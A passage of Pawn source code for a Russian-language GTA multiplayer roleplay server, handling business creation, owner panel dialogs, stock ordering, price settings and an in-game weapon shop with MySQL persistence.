			BizzInfo[TOTALBIZZ][bProduct] = tmpvar2;

			BizzInfo[TOTALBIZZ][bIcon] = CreateDynamicMapIcon(BizzInfo[TOTALBIZZ][bEntrx],BizzInfo[TOTALBIZZ][bEntry],BizzInfo[TOTALBIZZ][bEntrz], BizzInfo[TOTALBIZZ][bMIcon], 0,-1,-1,-1,200.0);
            new fee[64];
	        if(BizzInfo[TOTALBIZZ][bEnter] == 0) fee = "Бесплатный";
	        else format(fee, sizeof(fee), "%dр", BizzInfo[TOTALBIZZ][bEnter]);

			if(BizzInfo[TOTALBIZZ][bType] != 2 && BizzInfo[TOTALBIZZ][bType] != 7)
			{
			    new string[300];
				BizzInfo[TOTALBIZZ][bPickup] = CreatePickup(19132,1,BizzInfo[TOTALBIZZ][bEntrx],BizzInfo[TOTALBIZZ][bEntry],BizzInfo[TOTALBIZZ][bEntrz]);
				BizzInfo[TOTALBIZZ][bPickupExit] = CreatePickup(19132,1,BizzInfo[TOTALBIZZ][bExitx],BizzInfo[TOTALBIZZ][bExity],BizzInfo[TOTALBIZZ][bExitz],BizzInfo[TOTALBIZZ][bVirtual]);
				BizzInfo[TOTALBIZZ][bMenu] = CreateDynamicSphere(g_business_info[BizzInfo[TOTALBIZZ][bType]-1][BI_MENU_X], g_business_info[BizzInfo[TOTALBIZZ][bType]-1][BI_MENU_Y], g_business_info[BizzInfo[TOTALBIZZ][bType]-1][BI_MENU_Z],1.0,BizzInfo[TOTALBIZZ][bVirtual],BizzInfo[TOTALBIZZ][bInt]);
				if(BizzInfo[TOTALBIZZ][bType] == 8) CreateDynamicPickup(1275,1,g_business_info[BizzInfo[TOTALBIZZ][bType]-1][BI_MENU_X], g_business_info[BizzInfo[TOTALBIZZ][bType]-1][BI_MENU_Y], g_business_info[BizzInfo[TOTALBIZZ][bType]-1][BI_MENU_Z],BizzInfo[TOTALBIZZ][bVirtual],BizzInfo[TOTALBIZZ][bInt]);
				else CreateDynamicPickup(1274,1,g_business_info[BizzInfo[TOTALBIZZ][bType]-1][BI_MENU_X], g_business_info[BizzInfo[TOTALBIZZ][bType]-1][BI_MENU_Y], g_business_info[BizzInfo[TOTALBIZZ][bType]-1][BI_MENU_Z],BizzInfo[TOTALBIZZ][bVirtual],BizzInfo[TOTALBIZZ][bInt]);
				if(!strcmp(BizzInfo[TOTALBIZZ][bOwner],"None",true))
				{
					format(string, sizeof(string), "{33adff}%s\n{FFFFFF}Владелец: {99cc00}Государство\n{FFFFFF}Стоимость: {99cc00}%dр\n{FFFFFF}Крышует: {FFFFFF}%s", BizzInfo[TOTALBIZZ][bName], BizzInfo[TOTALBIZZ][bPrice]);
					LABELBIZZ[TOTALBIZZ] = CreateDynamic3DTextLabel(string,-1,BizzInfo[TOTALBIZZ][bEntrx], BizzInfo[TOTALBIZZ][bEntry], BizzInfo[TOTALBIZZ][bEntrz]+0.5,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1);
				}
				else
				{
					format(string, sizeof(string), "{33adff}%s\n{FFFFFF}Владелец: {99cc00}%s\n{FFFFFF}Вход: {ffcc00}%s\n{33ADFF}Крышует: {ffcc00}%s", BizzInfo[TOTALBIZZ][bName], BizzInfo[TOTALBIZZ][bOwner], fee);
					LABELBIZZ[TOTALBIZZ] = CreateDynamic3DTextLabel(string,-1,BizzInfo[TOTALBIZZ][bEntrx], BizzInfo[TOTALBIZZ][bEntry], BizzInfo[TOTALBIZZ][bEntrz]+0.5,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1);
				}
			}
			else if(BizzInfo[TOTALBIZZ][bType] == 2)
			{
			    new string[300];
				if(!strcmp(BizzInfo[TOTALBIZZ][bOwner],"None",true))
				{
					format(string, sizeof(string), "{ffcc33}Для заправки используйте /fill\n\n{33adff}%s\n{FFFFFF}Владелец: {99cc00}Государство\n{FFFFFF}Стоимость: {99cc00}%dр\n{FFFFFF}Цена за 1 литр бензина: {ffcc00}%iр\n{FFFFFF}Крышует: {FFCC00}%s", BizzInfo[TOTALBIZZ][bName], BizzInfo[TOTALBIZZ][bPrice], BizzInfo[TOTALBIZZ][bTill]);
					LABELBIZZ[TOTALBIZZ] = CreateDynamic3DTextLabel(string,-1,BizzInfo[TOTALBIZZ][bEntrx], BizzInfo[TOTALBIZZ][bEntry], BizzInfo[TOTALBIZZ][bEntrz]+1,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID);
				}
				else
				{
					format(string, sizeof(string), "{ffcc33}Для заправки используйте /fill\n\n{33adff}%s\n{FFFFFF}Владелец: {99cc00}%s\n{FFFFFF}Цена за 1 литр бензина: {ffcc00}%iр\n{FFFFFF}Крышует: {ffcc00}%s", BizzInfo[TOTALBIZZ][bName], BizzInfo[TOTALBIZZ][bOwner], BizzInfo[TOTALBIZZ][bTill]);
					LABELBIZZ[TOTALBIZZ] = CreateDynamic3DTextLabel(string,-1,BizzInfo[TOTALBIZZ][bEntrx], BizzInfo[TOTALBIZZ][bEntry], BizzInfo[TOTALBIZZ][bEntrz]+1,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID);
				}
			}
			else if(BizzInfo[TOTALBIZZ][bType] == 7)
			{
			    new string[300];
				if(!strcmp(BizzInfo[TOTALBIZZ][bOwner],"None",true))
				{
					format(string, sizeof(string), "{33adff}%s\n{FFFFFF}Владелец: {99cc00}Государство\n{FFFFFF}Стоимость: {99cc00}%dр\n{FFFFFF}Цена за 1 запчасть - {ffcc00}%iр\n{FFFFFF}Крышует: {ffcc00}%s\n\n{ffcc33}H - Заехать в СТО", BizzInfo[TOTALBIZZ][bName], BizzInfo[TOTALBIZZ][bPrice], BizzInfo[TOTALBIZZ][bTill]);
					LABELBIZZ[TOTALBIZZ] = CreateDynamic3DTextLabel(string,-1,BizzInfo[TOTALBIZZ][bEntrx], BizzInfo[TOTALBIZZ][bEntry], BizzInfo[TOTALBIZZ][bEntrz],20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1);
				}
				else
				{
					format(string, sizeof(string), "{33adff}%s\n{FFFFFF}Владелец: {99cc00}%s\n{FFFFFF}Цена за 1 запчасть - {ffcc00}%iр\n{FFFFFF}Крышует: {ffcc00}%s\n\n{ffcc33}H - Заехать в СТО", BizzInfo[TOTALBIZZ][bName], BizzInfo[TOTALBIZZ][bOwner], BizzInfo[TOTALBIZZ][bTill]);
					LABELBIZZ[TOTALBIZZ] = CreateDynamic3DTextLabel(string,COLOR_GREEN,BizzInfo[TOTALBIZZ][bEntrx], BizzInfo[TOTALBIZZ][bEntry], BizzInfo[TOTALBIZZ][bEntrz],20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1);
				}
			}
			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "INSERT INTO "T_BIZZ" (id, x, y, z, xt, yt, zt,vint, virt, owner, name, price, product, type, icon) VALUES (%i, '%f', '%f', '%f', '%f', '%f', '%f',%i, %i, '%s', '%s', %i, %i, %i, %i)",
			TOTALBIZZ,BizzInfo[TOTALBIZZ][bEntrx],BizzInfo[TOTALBIZZ][bEntry],BizzInfo[TOTALBIZZ][bEntrz],BizzInfo[TOTALBIZZ][bExitx],BizzInfo[TOTALBIZZ][bExity],BizzInfo[TOTALBIZZ][bExitz],
			BizzInfo[TOTALBIZZ][bInt],BizzInfo[TOTALBIZZ][bVirtual],BizzInfo[TOTALBIZZ][bOwner],BizzInfo[TOTALBIZZ][bName], BizzInfo[TOTALBIZZ][bPrice], BizzInfo[TOTALBIZZ][bProduct], BizzInfo[TOTALBIZZ][bType], BizzInfo[TOTALBIZZ][bMIcon]);
			mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
			SendMes(playerid,COLOR_LIME,"Бизнес номер %d создан",TOTALBIZZ);
			return 1;
		}
	case D_HEAL+9:
		{
			if(!response) return 1;
			new idx = GetPVarInt(playerid, "PlayerBizz");
			FreezePlayer(playerid, 5000);
			SetPlayerPos(playerid, g_business_info[BizzInfo[idx][bType]-1][BI_EXIT_X], g_business_info[BizzInfo[idx][bType]-1][BI_EXIT_Y], g_business_info[BizzInfo[idx][bType]-1][BI_EXIT_Z]);
			SetPlayerFacingAngle(playerid, g_business_info[BizzInfo[idx][bType]-1][BI_EXIT_A]);
			SetPlayerInterior(playerid,BizzInfo[idx][bInt]);
			SetPlayerVirtualWorld(playerid,BizzInfo[idx][bVirtual]);
			SetCameraBehindPlayer(playerid);
			SetTimerEx("PickupBack",3000,0,"i",playerid);
	        pickupentered[playerid] = 1;
		}
	case D_HEAL+10:
		{
			if(!response) return 1;
			new i = GetPVarInt(playerid, "PlayerBizz");
			switch(listitem)
			{
				case 0: BizzStats(playerid, i);
				case 1:
				{
					if(BizzInfo[i][bLock] == 0) return SendClientMessage(playerid, COLOR_GREY, "Бизнес уже открыт!");
					if(BizzInfo[i][bProduct] <= 0) return SendClientMessage(playerid, COLOR_GREY, "В бизнесе нет продуктов или нет лицензии!");
					BizzInfo[i][bLock] = 0;
					BizzInfo[i][bLockTime] = 0;
					MysqlUpdateBizzInt(i, "block", BizzInfo[i][bLock]);
					MysqlUpdateBizzInt(i, "locktime", BizzInfo[i][bLockTime]);
					SendClientMessage(playerid, COLOR_LIGHTRED, "Вы открыли бизнес. Всегда следите за состоянием продуктов");
					SendClientMessage(playerid, COLOR_LIGHTRED, "В противном случае Вы можете потерять бизнес");
				}
				case 2:
				{
				    if(BizzInfo[i][bType] == 1 || BizzInfo[i][bType] == 6 || BizzInfo[i][bType] == 7 || BizzInfo[i][bType] == 8 || BizzInfo[i][bType] == 9)
				    {
				        SendClientMessage(playerid, COLOR_GREY, "В данном типе бизнеса нельзя управлять ценой на товар!");
				    }
				    else
				    {
				        //ShowPlayerDialog(playerid, D_HEAL+11, 1, "Цена", "{ffffff}Введите цену за товар:", "Принять", "Отмена");
				        SendClientMessage(playerid, COLOR_GREY, "Данная функция временно недоступна");
				    }
				}
				case 3:
				{
				    if(BizzInfo[i][bType] == 2 || BizzInfo[i][bType] == 7)
				    {
				        SendClientMessage(playerid, COLOR_GREY, "В данном типе бизнеса нельзя управлять ценой за вход!");
				    }
				    else
				    {
				        ShowPlayerDialog(playerid, D_HEAL+12, 1, "Цена", "{ffffff}Введите цену за вход:", "Принять", "Отмена");
				    }
				}
				case 4:
				{
					ShowPlayerDialog(playerid, D_HEAL+16, 0, "Продать бизнес", "{ffffff}Вы хотите продать свой бизнес?\n\n{F04245}Вам вернут только половину стоимости бизнеса!", "Да", "Нет");
				}
				case 5: ShowPlayerDialog(playerid, D_HEAL+27, 1, "Заказать продукты", "{ffffff}Введите к-во товара, которое хотите заказать {FFFF00}(1ед. = 20р):", "Принять", "Отмена");
			}
		}
		case D_HEAL+27:
		{
		    if(!response) return callcmd::bpanel(playerid);
		    new idx = GetPVarInt(playerid, "PlayerBizz");
		    new prod = strval(inputtext);
		    new price = prod*10;
		    new string[128];
		    if(BizzInfo[idx][bType] == 1)
		    {
		        if(prod < 0 || prod > 5000-BizzInfo[idx][bProduct]) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете хранить больше 5 тыс. ед. товара");
		        if(GetMoney(playerid) < price)
				{
			        format(string, sizeof(string), "Вам нужно %dр для того чтобы заказать %d ед. товара", price, prod);
					SendClientMessage(playerid, COLOR_GREY, string);
					return 1;
				}
				SetPVarInt(playerid, "orderprod", prod);
				format(string, sizeof(string), "{FFFFFF}Вы действительно хотите заказать %d ед. товара за %dр?", prod, price);
				ShowPlayerDialog(playerid, D_HEAL+28, 0, " ", string, "Да", "Нет");
		    }
		    if(BizzInfo[idx][bType] == 2)
		    {
		        if(prod < 0 || prod > 5000-BizzInfo[idx][bProduct]) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете хранить больше 5000 л. бензина");
		        if(GetMoney(playerid) < price)
				{
			        format(string, sizeof(string), "Вам нужно %dр для того чтобы заказать %d л. бензина", price, prod);
					SendClientMessage(playerid, COLOR_GREY, string);
					return 1;
				}
				SetPVarInt(playerid, "orderprod", prod);
				format(string, sizeof(string), "{FFFFFF}Вы действительно хотите заказать %d л. бензина за %dр?", prod, price);
				ShowPlayerDialog(playerid, D_HEAL+28, 0, " ", string, "Да", "Нет");
		    }
		    if(BizzInfo[idx][bType] == 3)
		    {
		        if(prod < 0 || prod > 5000-BizzInfo[idx][bProduct]) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете хранить больше 5 тыс. ед. товара");
		        if(GetMoney(playerid) < price)
				{
			        format(string, sizeof(string), "Вам нужно %dр для того чтобы заказать %d ед. товара", price, prod);
					SendClientMessage(playerid, COLOR_GREY, string);
					return 1;
				}
				SetPVarInt(playerid, "orderprod", prod);
				format(string, sizeof(string), "{FFFFFF}Вы действительно хотите заказать %d ед. товара за %dр?", prod, price);
				ShowPlayerDialog(playerid, D_HEAL+28, 0, " ", string, "Да", "Нет");
		    }
		    if(BizzInfo[idx][bType] == 4 || BizzInfo[idx][bType] == 5)
		    {
		        if(prod < 0 || prod > 5000-BizzInfo[idx][bProduct]) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете хранить больше 5 тыс. ед. товара");
		        if(GetMoney(playerid) < price)
				{
			        format(string, sizeof(string), "Вам нужно %dр для того чтобы заказать %d ед. товара", price, prod);
					SendClientMessage(playerid, COLOR_GREY, string);
					return 1;
				}
				SetPVarInt(playerid, "orderprod", prod);
				format(string, sizeof(string), "{FFFFFF}Вы действительно хотите заказать %d ед. товара за %dр?", prod, price);
				ShowPlayerDialog(playerid, D_HEAL+28, 0, " ", string, "Да", "Нет");
		    }
		    if(BizzInfo[idx][bType] == 6)
		    {
		        if(prod < 0 || prod > 5000-BizzInfo[idx][bProduct]) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете хранить больше 5 тыс. ед. товара");
		        if(GetMoney(playerid) < price)
				{
			        format(string, sizeof(string), "Вам нужно %dр для того чтобы заказать %d ед. товара", price, prod);
					SendClientMessage(playerid, COLOR_GREY, string);
					return 1;
				}
				SetPVarInt(playerid, "orderprod", prod);
				format(string, sizeof(string), "{FFFFFF}Вы действительно хотите заказать %d ед. товара за %dр?", prod, price);
				ShowPlayerDialog(playerid, D_HEAL+28, 0, " ", string, "Да", "Нет");
			}
			if(BizzInfo[idx][bType] == 7)
			{
			    if(prod < 0 || prod > 5000-BizzInfo[idx][bProduct]) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете хранить больше 5 тыс. ед. товара");
			    if(GetMoney(playerid) < price)
				{
			        format(string, sizeof(string), "Вам нужно %dр для того чтобы заказать %d ед. товара", price, prod);
					SendClientMessage(playerid, COLOR_GREY, string);
					return 1;
				}
				SetPVarInt(playerid, "orderprod", prod);
				format(string, sizeof(string), "{FFFFFF}Вы действительно хотите заказать %d ед. товара за %dр?", prod, price);
				ShowPlayerDialog(playerid, D_HEAL+28, 0, " ", string, "Да", "Нет");
			}
			if(BizzInfo[idx][bType] == 8)
			{
			    if(prod < 0 || prod > 5000-BizzInfo[idx][bProduct]) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете хранить больше 5 тыс. ед. товара");
			    if(GetMoney(playerid) < price)
				{
			        format(string, sizeof(string), "Вам нужно %dр для того чтобы заказать %d ед. товара", price, prod);
					SendClientMessage(playerid, COLOR_GREY, string);
					return 1;
				}
				SetPVarInt(playerid, "orderprod", prod);
				format(string, sizeof(string), "{FFFFFF}Вы действительно хотите заказать %d ед. товара за %dр?", prod, price);
				ShowPlayerDialog(playerid, D_HEAL+28, 0, " ", string, "Да", "Нет");
			}
			if(BizzInfo[idx][bType] == 9)
			{
			    if(prod < 0 || prod > 5000-BizzInfo[idx][bProduct]) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете хранить больше 5 тыс. ед. товара");
			    if(GetMoney(playerid) < price)
				{
			        format(string, sizeof(string), "Вам нужно %dр для того чтобы заказать %d ед. товара", price, prod);
					SendClientMessage(playerid, COLOR_GREY, string);
					return 1;
				}
				SetPVarInt(playerid, "orderprod", prod);
				format(string, sizeof(string), "{FFFFFF}Вы действительно хотите заказать %d ед. товара за %dр?", prod, price);
				ShowPlayerDialog(playerid, D_HEAL+28, 0, " ", string, "Да", "Нет");
			}
			if(BizzInfo[idx][bType] == 10)
			{
				if(prod < 0 || prod > 5000-BizzInfo[idx][bProduct]) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете хранить больше 5 тыс. ед. товара");
			    if(GetMoney(playerid) < price)
				{
			        format(string, sizeof(string), "Вам нужно %dр для того чтобы заказать %d ед. товара", price, prod);
					SendClientMessage(playerid, COLOR_GREY, string);
					return 1;
				}
				SetPVarInt(playerid, "orderprod", prod);
				format(string, sizeof(string), "{FFFFFF}Вы действительно хотите заказать %d ед. товара за %dр?", prod, price);
				ShowPlayerDialog(playerid, D_HEAL+28, 0, " ", string, "Да", "Нет");
			}
			if(BizzInfo[idx][bType] == 11)
			{
				if(prod < 0 || prod > 5000-BizzInfo[idx][bProduct]) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете хранить больше 5 тыс. ед. товара");
			    if(GetMoney(playerid) < price)
				{
			        format(string, sizeof(string), "Вам нужно %dр для того чтобы заказать %d ед. товара", price, prod);
					SendClientMessage(playerid, COLOR_GREY, string);
					return 1;
				}
				SetPVarInt(playerid, "orderprod", prod);
				format(string, sizeof(string), "{FFFFFF}Вы действительно хотите заказать %d ед. товара за %dр?", prod, price);
				ShowPlayerDialog(playerid, D_HEAL+28, 0, " ", string, "Да", "Нет");
			}
			if(BizzInfo[idx][bType] == 12)
			{
				if(prod < 0 || prod > 5000-BizzInfo[idx][bProduct]) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете хранить больше 5 тыс. ед. товара");
			    if(GetMoney(playerid) < price)
				{
			        format(string, sizeof(string), "Вам нужно %dр для того чтобы заказать %d ед. товара", price, prod);
					SendClientMessage(playerid, COLOR_GREY, string);
					return 1;
				}
				SetPVarInt(playerid, "orderprod", prod);
				format(string, sizeof(string), "{FFFFFF}Вы действительно хотите заказать %d ед. товара за %dр?", prod, price);
				ShowPlayerDialog(playerid, D_HEAL+28, 0, " ", string, "Да", "Нет");
			}
		}
	case D_HEAL+28:
	    {
	        if(!response) return callcmd::bpanel(playerid);

	        new idx = GetPVarInt(playerid, "PlayerBizz");

			/*STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM orders WHERE business = %d", idx);
			mysql_query(dbHandle, STRING_GLOBAL);

			if(cache_num_rows())
				return SendClientMessage(playerid, C_RED, "Ваш заказ уже есть в списке");*/

	        new prod = GetPVarInt(playerid, "orderprod");
	        new price = prod*20;
			GiveMoney(playerid, -price);

			/*STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "INSERT INTO orders (business, count, price, time) VALUES ('%d', '%d', '%d', '%d')", idx, prod, price, gettime());
			mysql_query(dbHandle, STRING_GLOBAL);

			SendClientMessage(playerid, C_BLUE, "Ваш заказ был оформлен. Ожидайте доставки товара.");*/

			BizzInfo[idx][bProduct] += prod;
			MysqlUpdateBizzInt(idx, "product", BizzInfo[idx][bProduct]);
			SendClientMessage(playerid, COLOR_GREEN, "Товар был доставлен в Ваш бизнес");
			//SendClientMessage(playerid, COLOR_GREY, "- Временная возможность. Скоро появятся развозчики товаров");*/
	    }
	case D_HEAL+11:
		{
			if(!response) return 1;
			new price, i = GetPVarInt(playerid, "PlayerBizz");
			if(sscanf(inputtext, "i", price)) return ShowPlayerDialog(playerid, D_HEAL+11, 1, "Цена", "{ffffff}Введите цену за товар:", "Принять", "Отмена");
			if(BizzInfo[i][bType] == 2)
			{
				if(price < 20 || price > 150) return SendClientMessage(playerid, COLOR_GREY, "Неверная цена. Возможно от 20 до 150р");
			}
			else
			{
			    if(price < 1 || price > 500) return SendClientMessage(playerid, COLOR_GREY, "Неверная цена. Возможно от 1 до 500р");
			}
			BizzInfo[i][bTill] = price;
			MysqlUpdateBizzInt(i, "till", price);
			UpdateBizz(i);
			SendClientMessage(playerid, COLOR_BLUE, "Новая цена товара установлена");
			return 1;
		}
		case D_HEAL+12:
		{
			if(!response) return 1;
			new price, i = GetPVarInt(playerid, "PlayerBizz");
			if(sscanf(inputtext, "i", price)) return ShowPlayerDialog(playerid, D_HEAL+12, 1, "Цена", "{ffffff}Введите цену за вход:", "Принять", "Отмена");

			if(BizzInfo[i][bType] == 9)
			{
				if(price < 1000 || price > 10000) return SendClientMessage(playerid, COLOR_GREY, "Неверная цена. Возможно от 1000 до 10000р");
			}
			else
			{
				if(price < 0 || price > 5000) return SendClientMessage(playerid, COLOR_GREY, "Неверная цена. Возможно от 0 до 5000р");
			}
			BizzInfo[i][bEnter] = price;
			MysqlUpdateBizzInt(i, "penter", price);
			SendClientMessage(playerid, COLOR_BLUE, "Цена за вход успешно установлена");
			UpdateBizz(i);
			return 1;
		}
	case 1374:
		{
			if(!response) return 1;
			new i = GetPVarInt(playerid, "PlayerBizz"), string[128], newslot;
			switch(listitem)
			{
			case 0:
				{
				    new price = gGunCosts[0];
					if(GetMoney(playerid) < price) return SendMess(playerid, MSG_NOT_MONEY);
					if(CheckMaxVes(playerid,18,1,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
					GiveMoney(playerid, -price);
					if(BizzInfo[i][bProduct] > 0)
					{
						BizzInfo[i][bMoney] += price;
						BizzPay[i] += price;
						BizzInfo[i][bProduct] -= price / 3;
						MysqlUpdateBizzInt(i, "money", BizzInfo[i][bMoney]);
						MysqlUpdateBizzInt(i, "product", BizzInfo[i][bProduct]);
					}
					GiveItem(playerid, 18, 1);
					format(string, sizeof(string), "Вы купили кастет за %dр", price);
					SendClientMessage(playerid, COLOR_BLUE, string);
					GunShopList(playerid);
				}
			case 1:
				{
				    new price = gGunCosts[1];
					if(GetMoney(playerid) < price) return SendMess(playerid, MSG_NOT_MONEY);
					if(CheckMaxVes(playerid,19,1,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
					GiveMoney(playerid, -price);
					if(BizzInfo[i][bProduct] > 0)
					{
						BizzInfo[i][bMoney] += price;
						BizzPay[i] += price;
						BizzInfo[i][bProduct] -= price / 3;
						MysqlUpdateBizzInt(i, "money", BizzInfo[i][bMoney]);
						MysqlUpdateBizzInt(i, "product", BizzInfo[i][bProduct]);
					}
					GiveItem(playerid, 19, 1);
					format(string, sizeof(string), "Вы купили бейсбольную биту за %dр", price);
					SendClientMessage(playerid, COLOR_BLUE, string);
					GunShopList(playerid);
				}
			case 2:
				{
				    new price = gGunCosts[2];
					if(GetMoney(playerid) < price) return SendMess(playerid, MSG_NOT_MONEY);
					if(CheckMaxVes(playerid,20,1,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
					GiveMoney(playerid, -price);
					if(BizzInfo[i][bProduct] > 0)
					{
						BizzInfo[i][bMoney] += price;
						BizzPay[i] += price;
						BizzInfo[i][bProduct] -= price / 3;
						MysqlUpdateBizzInt(i, "money", BizzInfo[i][bMoney]);
						MysqlUpdateBizzInt(i, "product", BizzInfo[i][bProduct]);
					}
					GiveItem(playerid, 20, 1);
					format(string, sizeof(string), "Вы купили дробовик за %dр", price);
					SendClientMessage(playerid, COLOR_BLUE, string);
					GunShopList(playerid);
				}
            case 3:
				{
				    new price = gGunCosts[3];
					if(GetMoney(playerid) < price) return SendMess(playerid, MSG_NOT_MONEY);
					if(CheckMaxVes(playerid,21,1,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
					GiveMoney(playerid, -price);
					if(BizzInfo[i][bProduct] > 0)
					{
						BizzInfo[i][bMoney] += price;
						BizzPay[i] += price;
						BizzInfo[i][bProduct] -= price / 3;
						MysqlUpdateBizzInt(i, "money", BizzInfo[i][bMoney]);
						MysqlUpdateBizzInt(i, "product", BizzInfo[i][bProduct]);
					}
					GiveItem(playerid, 21, 1);
					format(string, sizeof(string), "Вы купили Colt М1911 за %dр", price);
					SendClientMessage(playerid, COLOR_BLUE, string);
					GunShopList(playerid);
				}
			case 4:
				{
				    new price = gGunCosts[4];
					if(GetMoney(playerid) < price) return SendMess(playerid, MSG_NOT_MONEY);
					if(CheckMaxVes(playerid,22,1,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
					GiveMoney(playerid, -price);
					if(BizzInfo[i][bProduct] > 0)
					{
						BizzInfo[i][bMoney] += price;
						BizzPay[i] += price;
						BizzInfo[i][bProduct] -= price / 3;
						MysqlUpdateBizzInt(i, "money", BizzInfo[i][bMoney]);
						MysqlUpdateBizzInt(i, "product", BizzInfo[i][bProduct]);
					}
					GiveItem(playerid, 22, 1);
					format(string, sizeof(string), "Вы купили Desert Eagle за %dр", price);
					SendClientMessage(playerid, COLOR_BLUE, string);
					GunShopList(playerid);
				}
			case 5:
				{
				    new price = gGunCosts[5];
					if(GetMoney(playerid) < price) return SendMess(playerid, MSG_NOT_MONEY);
					if(CheckMaxVes(playerid,23,1,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
					GiveMoney(playerid, -price);
					if(BizzInfo[i][bProduct] > 0)
					{
						BizzInfo[i][bMoney] += price;
						BizzPay[i] += price;
						BizzInfo[i][bProduct] -= price / 3;
						MysqlUpdateBizzInt(i, "money", BizzInfo[i][bMoney]);
						MysqlUpdateBizzInt(i, "product", BizzInfo[i][bProduct]);
					}
					GiveItem(playerid, 23, 1);
					format(string, sizeof(string), "Вы купили HK MP5 за %dр", price);
					SendClientMessage(playerid, COLOR_BLUE, string);
					GunShopList(playerid);
				}
            case 6:
				{
				    new price = gGunCosts[6];
					if(GetMoney(playerid) < price) return SendMess(playerid, MSG_NOT_MONEY);
					if(CheckMaxVes(playerid,24,1,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
					GiveMoney(playerid, -price);
					if(BizzInfo[i][bProduct] > 0)
					{
						BizzInfo[i][bMoney] += price;
						BizzPay[i] += price;
						BizzInfo[i][bProduct] -= price / 3;
						MysqlUpdateBizzInt(i, "money", BizzInfo[i][bMoney]);
						MysqlUpdateBizzInt(i, "product", BizzInfo[i][bProduct]);
					}
					GiveItem(playerid, 24, 1);
					format(string, sizeof(string), "Вы купили АК 47 за %dр", price);
					SendClientMessage(playerid, COLOR_BLUE, string);
					GunShopList(playerid);
				}
			case 7:
				{
				    new price = gGunCosts[7];
					if(GetMoney(playerid) < price) return SendMess(playerid, MSG_NOT_MONEY);
					if(CheckMaxVes(playerid,25,1,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
					GiveMoney(playerid, -price);
					if(BizzInfo[i][bProduct] > 0)
					{
						BizzInfo[i][bMoney] += price;
						BizzPay[i] += price;
						BizzInfo[i][bProduct] -= price / 3;
						MysqlUpdateBizzInt(i, "money", BizzInfo[i][bMoney]);
						MysqlUpdateBizzInt(i, "product", BizzInfo[i][bProduct]);
					}
					GiveItem(playerid, 25, 1);
					format(string, sizeof(string), "Вы купили Colt M4 за %dр", price);
					SendClientMessage(playerid, COLOR_BLUE, string);
					GunShopList(playerid);
				}
			case 8:
				{
				    new price = gGunCosts[8];
					if(GetMoney(playerid) < price) return SendMess(playerid, MSG_NOT_MONEY);
					if(CheckMaxVes(playerid,26,1,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
					GiveMoney(playerid, -price);
					if(BizzInfo[i][bProduct] > 0)
					{
						BizzInfo[i][bMoney] += price;
						BizzPay[i] += price;
						BizzInfo[i][bProduct] -= price / 3;
						MysqlUpdateBizzInt(i, "money", BizzInfo[i][bMoney]);
						MysqlUpdateBizzInt(i, "product", BizzInfo[i][bProduct]);
					}
					GiveItem(playerid, 26, 1);
					format(string, sizeof(string), "Вы купили Иж 73 за %dр", price);
					SendClientMessage(playerid, COLOR_BLUE, string);
					GunShopList(playerid);
				}
			}
			SaveItem(playerid,newslot);
		}
    case 1375:
	    {
	        new i = GetPVarInt(playerid, "PlayerBizz"), newslot;
			if(!response) return GunShopList(playerid);
			new ammo = strval(inputtext);
			new price = 60 * ammo;
			if(ammo < 1 || ammo > 100)
			{
			    SendClientMessage(playerid, COLOR_GREY, "Укажите значение патронов от 1 до 100");
    			ShowPlayerDialog(playerid, 1375, 1, "Покупка оружия", "{FFFFFF}Укажите количество патронов\nЦена одного патрона - 60р", "Купить", "Назад");
				return 1;
			}
	        if(GetMoney(playerid) < price)
			{
				SendMess(playerid, MSG_NOT_MONEY);
				ShowPlayerDialog(playerid, 1375, 1, "Покупка оружия", "{FFFFFF}Укажите количество патронов\nЦена одного патрона - 60р", "Купить", "Назад");
				return 1;
			}
			if(CheckMaxVes(playerid,27,ammo,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
			GiveMoney(playerid, -price);
			if(BizzInfo[i][bProduct] > 0)
			{
				BizzInfo[i][bMoney] += price;
				BizzPay[i] += price;
				BizzInfo[i][bProduct] -= price / 3;
				MysqlUpdateBizzInt(i, "money", BizzInfo[i][bMoney]);
				MysqlUpdateBizzInt(i, "product", BizzInfo[i][bProduct]);
			}
			GiveItem(playerid, 27, ammo);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Вы купили патроны(%d) за %dр", ammo, price);
			SendClientMessage(playerid, COLOR_BLUE, STRING_GLOBAL);
			GunShopList(playerid);
			SaveItem(playerid,newslot);
			return 1;
	    }
	case D_HEAL+13:
		{
			if(!response) return 1;
			new i = GetPVarInt(playerid, "PlayerBizz");
